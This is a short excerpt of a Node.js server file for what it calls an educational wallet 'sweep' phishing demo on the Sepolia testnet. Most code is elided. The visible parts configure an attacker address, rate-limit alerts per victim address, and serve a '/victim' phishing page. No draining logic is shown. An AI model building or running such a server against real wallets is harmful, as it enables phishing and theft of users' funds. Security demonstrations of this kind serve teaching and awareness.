/* server.js - Unified Educational Sweep Demo Server
...
if (!ALCHEMY_URL || !ATTACKER_ADDR) {
  console.error("⚠️  Set ALCHEMY_URL and ATTACKER_ADDR in .env");
  process.exit(1);
}
...
// ---------- Simple in-memory alert rate-limit ----------
const ALERT_COOLDOWN_MS = 30 * 1000; // 30s per victim address
const lastAlertFor = new Map();
...
app.listen(PORT, '0.0.0.0', () => {
  console.log('\n⚠️  EDUCATIONAL USE ONLY - SEPOLIA TESTNET ⚠️');
  console.log('=====================================');
  console.log(`Server running on http://0.0.0.0:${PORT}`);
  console.log(`Landing page: http://0.0.0.0:${PORT}/`);
  console.log(`Phishing demo: http://0.0.0.0:${PORT}/victim`);
  console.log('=====================================\n');
});
